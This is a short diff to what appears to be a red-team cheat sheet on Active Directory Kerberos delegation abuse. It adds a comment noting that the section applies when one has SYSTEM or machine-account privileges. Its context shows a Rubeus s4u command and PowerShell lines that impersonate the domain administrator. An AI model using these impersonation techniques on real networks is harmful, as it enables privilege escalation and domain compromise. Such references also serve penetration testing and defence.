@@ -302,6 +302,8 @@ Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offe
 ```
 ### Delegation System/Machine
 ```shell
+# if u are in a shell of context of machine account or in other words you have a SYSTEM level privileges on a machine
+
 [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
 $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
 $idToImpersonate.Impersonate()
